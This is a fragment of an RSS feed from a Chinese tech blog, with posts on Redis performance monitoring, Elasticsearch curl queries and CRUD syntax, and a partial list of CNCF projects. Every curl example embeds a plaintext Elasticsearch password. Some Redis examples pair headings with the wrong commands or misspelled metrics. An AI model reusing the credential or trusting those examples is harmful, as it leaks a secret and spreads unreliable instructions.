            &amp;#125;
        ],
        &amp;quot;mechanisms&amp;quot;: [
            &amp;quot;SCRAM-SHA-1&amp;quot;
        ]
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;原创地址:&lt;a href=&#34;https://mp.weixin.qq.com/s/YWcwaPIQDP6ln_6qtvnsOA&#34;&gt;https://mp.weixin.qq.com/s/YWcwaPIQDP6ln_6qtvnsOA&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2020/06/20/redis-top/</guid>
            <title>Redis性能指标监控</title>
            <link>https://erik.xyz/2020/06/20/redis-top/</link>
            <category>redis</category>
            <category>redis监控</category>
            <pubDate>Sat, 20 Jun 2020 15:31:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;h5 id=&#34;监控指标&#34;&gt;&lt;a href=&#34;#监控指标&#34; class=&#34;headerlink&#34; title=&#34;监控指标&#34;&gt;&lt;/a&gt;监控指标&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;性能指标：Performance&lt;/li&gt;
&lt;li&gt;内存指标: Memory&lt;/li&gt;
&lt;li&gt;基本活动指标：Basic activity&lt;/li&gt;
&lt;li&gt;持久性指标: Persistence&lt;/li&gt;
&lt;li&gt;错误指标：Error&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h5 id=&#34;性能指标：Performance&#34;&gt;&lt;a href=&#34;#性能指标：Performance&#34; class=&#34;headerlink&#34; title=&#34;性能指标：Performance&#34;&gt;&lt;/a&gt;性能指标：Performance&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;latency&lt;/td&gt;
&lt;td&gt;Redis响应一个请求的时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;instantaneous_ops_per_sec&lt;/td&gt;
&lt;td&gt;平均每秒处理请求总数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hi rate(calculated)&lt;/td&gt;
&lt;td&gt;缓存命中率（计算出来的&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h5 id=&#34;内存指标-Memory&#34;&gt;&lt;a href=&#34;#内存指标-Memory&#34; class=&#34;headerlink&#34; title=&#34;内存指标: Memory&#34;&gt;&lt;/a&gt;内存指标: Memory&lt;/h5&gt;&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;used_memory&lt;/td&gt;
&lt;td&gt;已使用内存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mem_fragmentation_ratio&lt;/td&gt;
&lt;td&gt;内存碎片率&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;evicted_keys&lt;/td&gt;
&lt;td&gt;由于最大内存限制被移除的key的数量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;blocked_clients&lt;/td&gt;
&lt;td&gt;由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h5 id=&#34;基本活动指标：Basic-activity&#34;&gt;&lt;a href=&#34;#基本活动指标：Basic-activity&#34; class=&#34;headerlink&#34; title=&#34;基本活动指标：Basic activity&#34;&gt;&lt;/a&gt;基本活动指标：Basic activity&lt;/h5&gt;&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;connected_clients&lt;/td&gt;
&lt;td&gt;客户端连接数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;conected_laves&lt;/td&gt;
&lt;td&gt;slave数量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;master_last_io_seconds_ago&lt;/td&gt;
&lt;td&gt;最近一次主从交互之后的秒数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;keyspace&lt;/td&gt;
&lt;td&gt;数据库中的key值总数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h5 id=&#34;持久性指标-Persistence&#34;&gt;&lt;a href=&#34;#持久性指标-Persistence&#34; class=&#34;headerlink&#34; title=&#34;持久性指标: Persistence&#34;&gt;&lt;/a&gt;持久性指标: Persistence&lt;/h5&gt;&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;rdb_last_save_time&lt;/td&gt;
&lt;td&gt;最后一次持久化保存磁盘的时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;rdb_changes_sice_last_save&lt;/td&gt;
&lt;td&gt;自最后一次持久化以来数据库的更改数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h5 id=&#34;错误指标：Error&#34;&gt;&lt;a href=&#34;#错误指标：Error&#34; class=&#34;headerlink&#34; title=&#34;错误指标：Error&#34;&gt;&lt;/a&gt;错误指标：Error&lt;/h5&gt;&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;rejected_connections&lt;/td&gt;
&lt;td&gt;由于达到maxclient限制而被拒绝的连接数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;keyspace_misses&lt;/td&gt;
&lt;td&gt;key值查找失败(没有命中)次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;master_link_down_since_seconds&lt;/td&gt;
&lt;td&gt;主从断开的持续时间（以秒为单位)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h5 id=&#34;监控方式&#34;&gt;&lt;a href=&#34;#监控方式&#34; class=&#34;headerlink&#34; title=&#34;监控方式&#34;&gt;&lt;/a&gt;监控方式&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;redis-benchmark&lt;/li&gt;
&lt;li&gt;redis-stat&lt;/li&gt;
&lt;li&gt;redis-faina&lt;/li&gt;
&lt;li&gt;redislive&lt;/li&gt;
&lt;li&gt;redis-cli&lt;/li&gt;
&lt;li&gt;monitor&lt;/li&gt;
&lt;li&gt;showlog&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.get：获取慢查询日志&lt;/p&gt;
&lt;p&gt;2.len：获取慢查询日志条目数&lt;/p&gt;
&lt;p&gt;3.reset：重置慢查询日志&lt;/p&gt;
&lt;p&gt;相关配置：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;slowlog-log-slower-than 1000 # 设置慢查询的时间下线，单位：微秒
slowlog-max-len 100 # 设置慢查询命令对应的日志显示长度，单位：命令数
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;info（可以一次性获取所有的信息，也可以按块获取信息）&lt;/p&gt;
&lt;p&gt;1.server:服务器运行的环境参数&lt;/p&gt;
&lt;p&gt;2.clients:客户端相关信息&lt;/p&gt;
&lt;p&gt;3.memory：服务器运行内存统计数据&lt;/p&gt;
&lt;p&gt;4.persistence：持久化信息&lt;/p&gt;
&lt;p&gt;5.stats：通用统计数据&lt;/p&gt;
&lt;p&gt;6.Replication：主从复制相关信息&lt;/p&gt;
&lt;p&gt;7.CPU：CPU使用情况&lt;/p&gt;
&lt;p&gt;8.cluster：集群信息&lt;/p&gt;
&lt;p&gt;9.Keypass：键值对统计数量信息&lt;/p&gt;
&lt;h5 id=&#34;终端info命令使用&#34;&gt;&lt;a href=&#34;#终端info命令使用&#34; class=&#34;headerlink&#34; title=&#34;终端info命令使用&#34;&gt;&lt;/a&gt;终端info命令使用&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;./redis-cli info 按块获取信息 | grep 需要过滤的参数

./redis-cli info stats | grep ops
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;交互式info命令使用&#34;&gt;&lt;a href=&#34;#交互式info命令使用&#34; class=&#34;headerlink&#34; title=&#34;交互式info命令使用&#34;&gt;&lt;/a&gt;交互式info命令使用&lt;/h5&gt;&lt;pre&gt;&lt;code&gt; #./redis-cli 
&amp;gt; info server
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;性能监控：&#34;&gt;&lt;a href=&#34;#性能监控：&#34; class=&#34;headerlink&#34; title=&#34;性能监控：&#34;&gt;&lt;/a&gt;性能监控：&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;redis-cli info | grep ops # 每秒操作数
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;内存监控&#34;&gt;&lt;a href=&#34;#内存监控&#34; class=&#34;headerlink&#34; title=&#34;内存监控&#34;&gt;&lt;/a&gt;内存监控&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep used | grep human       
used_memory_human:2.99M  # 内存分配器从操作系统分配的内存总量
used_memory_rss_human:8.04M  #操作系统看到的内存占用，top命令看到的内存
used_memory_peak_human:7.77M # redis内存消耗的峰值
used_memory_lua_human:37.00K   # lua脚本引擎占用的内存大小
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;由于BLPOP-BRPOP-or-BRPOPLPUSH而备阻塞的客户端&#34;&gt;&lt;a href=&#34;#由于BLPOP-BRPOP-or-BRPOPLPUSH而备阻塞的客户端&#34; class=&#34;headerlink&#34; title=&#34;由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端&#34;&gt;&lt;/a&gt;由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep blocked_clients
blocked_clients:0  
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;由于最大内存限制被移除的key的数量&#34;&gt;&lt;a href=&#34;#由于最大内存限制被移除的key的数量&#34; class=&#34;headerlink&#34; title=&#34;由于最大内存限制被移除的key的数量&#34;&gt;&lt;/a&gt;由于最大内存限制被移除的key的数量&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep evicted_keys
evicted_keys:0  #
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;内存碎片率&#34;&gt;&lt;a href=&#34;#内存碎片率&#34; class=&#34;headerlink&#34; title=&#34;内存碎片率&#34;&gt;&lt;/a&gt;内存碎片率&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep mem_fragmentation_ratio
mem_fragmentation_ratio:2.74 
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;已使用内存&#34;&gt;&lt;a href=&#34;#已使用内存&#34; class=&#34;headerlink&#34; title=&#34;已使用内存&#34;&gt;&lt;/a&gt;已使用内存&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep used_memory:
used_memory:3133624  
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;基本活动指标：&#34;&gt;&lt;a href=&#34;#基本活动指标：&#34; class=&#34;headerlink&#34; title=&#34;基本活动指标：&#34;&gt;&lt;/a&gt;基本活动指标：&lt;/h5&gt;&lt;p&gt;redis连接了多少客户端 通过观察其数量可以确认是否存在意料之外的连接。如果发现数量不对劲，就可以使用lcient list指令列出所有的客户端链接地址来确定源头。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected_clients
connected_clients:1


[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected
connected_clients:1   # 客户端连接数量
connected_slaves:1   # slave连接数量
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;持久性指标：&#34;&gt;&lt;a href=&#34;#持久性指标：&#34; class=&#34;headerlink&#34; title=&#34;持久性指标：&#34;&gt;&lt;/a&gt;持久性指标：&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_last_save_time
rdb_last_save_time:1591876204  # 最后一次持久化保存磁盘的时间戳
[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_changes_since_last_save
rdb_changes_since_last_save:0   # 自最后一次持久化以来数据库的更改数
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;错误指标&#34;&gt;&lt;a href=&#34;#错误指标&#34; class=&#34;headerlink&#34; title=&#34;错误指标&#34;&gt;&lt;/a&gt;错误指标&lt;/h5&gt;&lt;p&gt;由于超出最大连接数限制而被拒绝的客户端连接次数，如果这个数字很大，则意味着服务器的最大连接数设置得过低，需要调整maxclients&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected_clients
connected_clients:1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;key值查找失败(没有命中)次数，出现多次可能是被hei ke gongjji&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep keyspace
keyspace_misses:0   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主从断开的持续时间（以秒为单位)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_changes_since_last_save
rdb_changes_since_last_save:0  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;复制积压缓冲区如果设置得太小，会导致里面的指令被覆盖掉找不到偏移量，从而触发全量同步&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep backlog_size
repl_backlog_size:1048576
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过查看sync_partial_err变量的次数来决定是否需要扩大积压缓冲区，它表示主从半同步复制失败的次数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@CombCloud-2020110836 src]# ./redis-cli info | grep sync_partial_err
sync_partial_err:1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;redis性能测试命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./redis-benchmark -c 100 -n 5000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;原创地址：&lt;a href=&#34;https://mp.weixin.qq.com/s/gu1ZLXlR9ud4wnssYMVkMw&#34;&gt;https://mp.weixin.qq.com/s/gu1ZLXlR9ud4wnssYMVkMw&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2020/06/18/elasticsearch-curd/</guid>
            <title>Elasticsearch基本CURD操作</title>
            <link>https://erik.xyz/2020/06/18/elasticsearch-curd/</link>
            <category>elasticsearch</category>
            <pubDate>Thu, 18 Jun 2020 22:35:50 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;当我们的ES集群搭建完成以后，我怎么能看到集群中各个节点状态以及主节点和健康情况呢，如下讲解使用curl命令来与ES集群进行交互、分别有查询主节点情况、集群状态、以及创建索引查看索引、查看分片以及对ES集群进行查询请求等操作。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;CURL语法讲解&lt;/p&gt;
&lt;p&gt;RESTful API:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    curl  -X&amp;lt;VERB&amp;gt; &amp;#39;&amp;lt;PROTOCOL&amp;gt;://&amp;lt;HOST&amp;gt;:&amp;lt;PORT&amp;gt;/&amp;lt;PATH&amp;gt;?&amp;lt;QUERY_STRING&amp;gt;&amp;#39; -d &amp;#39;&amp;lt;BODY&amp;gt;&amp;#39;
    -X：指定请求方式

    &amp;lt;VERB&amp;gt;：GET,POST,PUT,DELETE   一般请求为GET、提交变更为POST、上传文件为PUT、删除操作为DELETE

    &amp;lt;PROTOCOL&amp;gt;：协议，一般为HTTP协议

    &amp;lt;HOST&amp;gt;：主机，可为主机的IP地址或Hostname

    &amp;lt;PORT&amp;gt;：主机端口

    &amp;lt;PATH&amp;gt;：路径，主机端口后的路径，如下几个路径：/_cat, /_search, /_cluster   /_cat路径覆盖了大多数的信息内容,/_search为搜索所有的索引和文档类型

    &amp;lt;QUERY_STRING&amp;gt;：查询字符串匹配规则

    -d：指定主体内容

    &amp;lt;BODY&amp;gt;：json格式的请求主体
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Elasticseearch基本查询语句&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    //查看_cat支持的信息
    kibana: GET /_cat
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat&amp;#39;        

    //查看主节点信息
    kibana: GET /_cat/master?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/master?v&amp;#39;        

    //查看集群所有节点
    kibana: GET /_cat/nodes?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/nodes?v&amp;#39;        

    //查看所有索引信息
    kibana: GET /_cat/indices?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/indices?v&amp;#39;        

    //查看单个索引信息
    kibana: GET /_cat/indices/movies?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/indices/movies?v&amp;#39;        

    //查看所有分片信息
    kibana: GET /_cat/shards?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/shards?v&amp;#39;        

    //查看单个索引分片信息
    kibana: GET /_cat/shards/movies?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/shards/movies?v&amp;#39;        

    //查看集群健康状态
    kibana: GET /_cat/health?v
    kibana: GET _cluster/health
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/health?v&amp;#39;
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cluster/health?pretty&amp;#39;        

    //查看插件
    kibana: GET /_cat/plugins?v
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/plugins?v&amp;#39;        

    //查看所有索引文档总数
    kibana: GET _all/_count
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_all/_count?pretty&amp;#39;        

    //查看指定索引文档总数
    kibana: GET movies/_count
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/movies/_count?pretty&amp;#39;        

    //查看所有模板
    kibana: GET _cat/templates
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/templates?v&amp;#39;        

    //查看状态为绿的索引
    kibana: GET /_cat/indices?v&amp;amp;health=green
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/indices?v&amp;amp;health=green&amp;#39;        

    //查看movies索引元数据
    kibana: GET movies
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/movies?pretty&amp;#39;        

    //按照文档数量排序索引
    kibana: GET _cat/indices?v&amp;amp;s=docs.count:desc
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/indices?v&amp;amp;s=docs.count:desc&amp;#39;        

    //查看各个索引占用内存大小并进行排序
    kibana: 
    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &amp;#39;http://192.168.31.215:9201/_cat/indices?v&amp;amp;h=i,tm&amp;amp;s=tm:desc&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Elasticsearch CURD语法&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;CURD&lt;/th&gt;
&lt;th&gt;请求方式&lt;/th&gt;
&lt;th&gt;主体&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Create&lt;/td&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;/index/_create/id&lt;/td&gt;
&lt;td&gt;指定Document ID，创建文档，如果ID已存在，则失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Create&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/index/_create/id&lt;/td&gt;
&lt;td&gt;指定Document ID，创建文档，如果ID已存在，则失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Create&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/index/_doc&lt;/td&gt;
&lt;td&gt;自动生成ID，不会重复，重复提交则创建多个文档，文档版本都为1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Index&lt;/td&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;/index/_doc/id&lt;/td&gt;
&lt;td&gt;如果ID不存在,则创建新的文档,如果ID存在,则删除现有文档后创建新的文档,版本+1,ID相同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Index&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/index/_doc/id&lt;/td&gt;
&lt;td&gt;如果ID不存在,则创建新的文档,如果ID存在,则删除现有文档后创建新的文档,版本+1,ID相同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Read&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/index/_doc/id&lt;/td&gt;
&lt;td&gt;查看Document ID为1的文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Update&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/index/_doc/id&lt;/td&gt;
&lt;td&gt;文档必须存在,否则更新失败,只能增量修改字段,不能减少字段,字段值可以随意修改,版本加1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Delete&lt;/td&gt;
&lt;td&gt;Delete&lt;/td&gt;
&lt;td&gt;/index/_doc/id&lt;/td&gt;
&lt;td&gt;文档必须存在,否则删除返回”not_found”&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Delete&lt;/td&gt;
&lt;td&gt;Delete&lt;/td&gt;
&lt;td&gt;/index&lt;/td&gt;
&lt;td&gt;删除索引，索引内的文档也会被随之而删除,要删除的索引必须存在,否则返回 “404”&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;原创地址：&lt;a href=&#34;https://mp.weixin.qq.com/s/qZq_EV9q1LUUzOZeTzhA-g&#34;&gt;https://mp.weixin.qq.com/s/qZq_EV9q1LUUzOZeTzhA-g&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2020/04/22/common-cncf-project/</guid>
            <title>开源云原生项目</title>
            <link>https://erik.xyz/2020/04/22/common-cncf-project/</link>
            <category>开源云</category>
            <category>容器</category>
            <category>cncf</category>
            <category>监控</category>
            <pubDate>Wed, 22 Apr 2020 08:28:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://kubernetes.io&#34;&gt;Kubernetes&lt;/a&gt;  容器编排平台&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/kubernetes/kubernetes&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Kubernetes! 说起云原生应用，怎么能不提 Kubernetes 呢？Google 发明的 Kubernetes 无疑是最著名的基于容器的应用程序的容器编排平台，而且它还是一个开源工具。&lt;/p&gt;
&lt;p&gt;什么是容器编排平台？通常，一个容器引擎本身可以管理几个容器。但是，当你谈论数千个容器和数百个服务时，管理这些容器变得非常复杂。这就是容器编排引擎的用武之地。容器编排引擎通过自动化容器的部署、管理、网络和可用性来帮助管理大量的容器。&lt;/p&gt;
&lt;p&gt;Docker Swarm 和 Mesosphere Marathon 也是容器编排引擎，但是可以肯定地说，Kubernetes 已经赢得了这场比赛（至少现在是这样）。Kubernetes 还催生了像 OKD 这样的容器即服务（CaaS）平台，它是 Kubernetes 的 Origin 社区发行版，并成了 Red Hat OpenShift 的一部分。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://prometheus.io&#34;&gt;Prometheus&lt;/a&gt;    系统和服务监控工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/prometheus/prometheus&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Prometheus 是 2012 年在 SoundCloud 上构建的一个开源的系统监控和告警工具。之后，许多公司和组织都采用了 Prometheus，并且该项目拥有非常活跃的开发者和用户群体。现在，它已经成为一个独立的开源项目，独立于公司之外进行维护。&lt;br&gt;理解 Prometheus 的最简单方法是可视化一个生产系统，该系统需要 24（小时）x 365（天）都可以正常运行。没有哪个系统是完美的，也有减少故障的技术（称为容错系统），但是，如果出现问题，最重要的是尽快发现问题。这就是像 Prometheus 这样的监控工具的用武之地。Prometheus 不仅仅是一个容器监控工具，但它在云原生应用公司中最受欢迎。此外，其他开源监视工具，包括 Grafana，都借助了 Prometheus。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.envoyproxy.io&#34;&gt;Envoy&lt;/a&gt;        边缘和服务代理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/envoyproxy/envoy&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Envoy（或 Envoy 代理）是专为云原生应用设计的开源的边缘代理和服务代理。由 Lyft 创建的 Envoy 是为单一服务和应用而设计的高性能的 C++ 开发的分布式代理，同时也是为由大量微服务组成的服务网格架构而设计的通信总线和通用数据平面。Envoy 建立在 Nginx、HAProxy、硬件负载均衡器和云负载均衡器等解决方案的基础上，Envoy 与每个应用相伴（并行）运行，并通过提供平台无关的方式提供通用特性来抽象网络。&lt;/p&gt;
&lt;p&gt;当基础设施中的所有服务流量都经过 Envoy 网格时，很容易就可以通过一致的可观测性来可视化问题域，调整整体性能，并在单个位置添加基础功能。基本上，Envoy 代理是一个可帮助组织为生产环境构建容错系统的服务网格工具。&lt;/p&gt;
&lt;p&gt;服务网格应用有很多替代方案，例如 Uber 的 Linkerd（下面会讨论）和 Istio。Istio 通过将其部署为 Sidecar 并利用了 Mixer 的配置模型，实现了对 Envoy 的扩展。Envoy 的显著特性有：&lt;/p&gt;
&lt;p&gt;◈ 包括所有的“入场筹码(table stakes)（LCTT 译注：引申为基础必备特性）”特性（与 Istio 这样的控制平面组合时）&lt;/p&gt;
&lt;p&gt;◈ 带载运行时 99% 数据可达到低延时&lt;/p&gt;
&lt;p&gt;◈ 可以作为核心的 L3/L4 过滤器，提供了开箱即用的 L7 过滤器&lt;/p&gt;
&lt;p&gt;◈ 支持 gRPC 和 HTTP/2（上行/下行）&lt;/p&gt;
